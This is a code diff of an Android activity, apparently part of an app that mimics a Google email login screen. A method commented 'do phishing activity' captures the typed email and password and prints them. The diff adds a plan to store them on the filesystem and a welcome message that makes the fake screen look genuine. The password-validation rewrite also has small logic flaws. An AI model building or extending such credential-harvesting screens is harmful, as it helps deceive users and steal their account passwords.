@@ -35,7 +35,11 @@ public class LoginGoogleEmail extends AppCompatActivity {
 
     // do phishing activity
     private void getUserInfo(View v, EditText email, EditText password){
+        // TODO: store username and text to filesystem
         System.out.println(email.getText() + " and " + password.getText());
+        String welcome = getString(R.string.welcome) + " " + email.getText().toString();
+        Toast.makeText(getApplicationContext(), welcome, Toast.LENGTH_LONG).show();
+        // intent to go to MainActivity
         Intent i = new Intent(this, MainActivity.class);
         startActivity(i);
     }
@@ -55,9 +59,15 @@ public class LoginGoogleEmail extends AppCompatActivity {
 
     // password validation
     private boolean validatePassword(View v, String password){
-        String error = getString(R.string.invalid_password2);
-        Toast.makeText(getApplicationContext(), error, Toast.LENGTH_LONG).show();
-        return password != null && password.trim().length() > 8;
+
+        if (password.trim().length() < 8){
+            String error = getString(R.string.invalid_password2);
+            Toast.makeText(getApplicationContext(), error, Toast.LENGTH_LONG).show();
+            return false;
+        }
+        else {
+            return password != null && password.trim().length() > 8;
+        }
     }
 
 }
